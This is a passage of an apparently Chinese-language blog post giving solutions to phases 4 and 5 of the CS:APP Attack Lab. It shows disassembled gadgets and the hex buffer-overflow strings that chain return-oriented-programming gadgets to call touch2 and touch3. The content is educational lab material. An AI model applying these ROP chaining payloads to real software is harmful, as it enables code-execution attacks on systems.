<p> ``` 946 0000000000401a1f &lt;addval_350&gt;: 947 401a1f: 8d 87 cd 0e b7 58 lea 0x58b70ecd(%rdi),%eax// pop rax 948 401a25: c3 950 0000000000401a26 &lt;setval_464&gt;: 951 401a26: c7 07 18 48 89 c7 movl $0xc7894818,(%rdi) //rax-&gt;rdi 952 401a2c: c3 retq</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造攻击代码如下</span><br></pre></td></tr></table></figure>

<p> 23 33 33 33 33 33 33 33 23 33 33 33 33 33 33 33 23 33 33 33 33 33 33 33 23 33 33 33 33 33 33 33 23 33 33 33 33 33 33 33//使缓冲区溢出 24 1a 40 00 00 00 00 00// Pop %rax cb 0e 11 29 00 00 00 00//cookie值存到%rax中，即待pop的值 29 1a 40 00 00 00 00 00// Mov %rax，%rdi 49 18 40 00 00 00 00 00//调用touch2</p>
</li>
<li><p>phase5 找到的汇编代码如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1034 0000000000401ab0 &lt;addval_250&gt;:</span><br><span class="line">1035   401ab0:   8d 87         48 89 e0 c3       lea    -0x3c1f76b8(%rdi),%eax&#x2F;&#x2F;rsp-&gt;rax  401ab2</span><br><span class="line">1036   401ab6:   c3                      retq</span><br><span class="line">950 0000000000401a26 &lt;setval_464&gt;:</span><br><span class="line">951   401a26:   c7 07 18      48 89 c7       movl   $0xc7894818,(%rdi)&#x2F;&#x2F;rax-&gt;rdi           401a29</span><br><span class="line">952   401a2c:   c3                      retq</span><br><span class="line">946 0000000000401a1f &lt;addval_350&gt;:</span><br><span class="line">947   401a1f:   8d 87 cd 0e b7 58       lea    0x58b70ecd(%rdi),%eax&#x2F;&#x2F; pop rax         401a24</span><br><span class="line">948   401a25:   c3</span><br><span class="line">1030 0000000000401aaa &lt;getval_177&gt;:</span><br><span class="line">1031   401aaa:   b8 89 c1 20 c0          mov    $0xc020c189,%eax&#x2F;&#x2F;eax-&gt;ecx          401aab</span><br><span class="line">1032   401aaf:   c3                      retq</span><br><span class="line">1014 0000000000401a8f &lt;getval_110&gt;:</span><br><span class="line">1015   401a8f:   b8 89 ca 84 c0          mov    $0xc084ca89,%eax&#x2F;&#x2F;ecx-&gt;edx          401a90</span><br><span class="line">1016   401a94:   c3                      retq</span><br><span class="line">1086 0000000000401b09 &lt;getval_428&gt;:</span><br><span class="line">1087   401b09:   b8 ee 89 d6 c3          mov    $0xc3d689ee,%eax&#x2F;&#x2F;edx-&gt;esi         401b0b</span><br><span class="line">1088   401b0e:   c3</span><br><span class="line">958 0000000000401a33 &lt;add_xy&gt;:</span><br><span class="line">959   401a33:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax&#x2F;&#x2F;lea    (%rdi,%rsi,1),%rax    401a33</span><br><span class="line">960   401a37:   c3                      retq</span><br><span class="line">950 0000000000401a26 &lt;setval_464&gt;:</span><br><span class="line">951   401a26:   c7 07 18 48 89 c7       movl   $0xc7894818,(%rdi)    &#x2F;&#x2F;rax-rdi        401a29</span><br><span class="line">952   401a2c:   c3                      retq</span><br></pre></td></tr></table></figure>

<p> 构造如下字符串，至此实验完成</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">23 33 33 33 33 33 33 33</span><br><span class="line">23 33 33 33 33 33 33 33</span><br><span class="line">23 33 33 33 33 33 33 33</span><br><span class="line">23 33 33 33 33 33 33 33</span><br><span class="line">23 33 33 33 33 33 33 33</span><br><span class="line">b2 1a 40 00 00 00 00 00&#x2F;&#x2F;rsp-&gt;rax</span><br><span class="line">29 1a 40 00 00 00 00 00&#x2F;&#x2F;rax-&gt;rdi</span><br><span class="line">24 1a 40 00 00 00 00 00&#x2F;&#x2F; pop rax</span><br><span class="line">48 00 00 00 00 00 00 00&#x2F;&#x2F;bias</span><br><span class="line">ab 1a 40 00 00 00 00 00&#x2F;&#x2F;eax-&gt;ecx</span><br><span class="line">90 1a 40 00 00 00 00 00&#x2F;&#x2F;ecx-&gt;edx</span><br><span class="line">0b 1b 40 00 00 00 00 00&#x2F;&#x2F;edx-&gt;esi</span><br><span class="line">33 1a 40 00 00 00 00 00&#x2F;&#x2F;lea    (%rdi,%rsi,1),%rax</span><br><span class="line">29 1a 40 00 00 00 00 00&#x2F;&#x2F;rax-rdi</span><br><span class="line">5a 19 40 00 00 00 00 00&#x2F;&#x2F;touch3</span><br><span class="line">32 39 31 31 30 65 63 62&#x2F;&#x2F;cookie</span><br></pre></td></tr></table></figure></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">lagrange</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">14</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">分类</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">lagrange</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
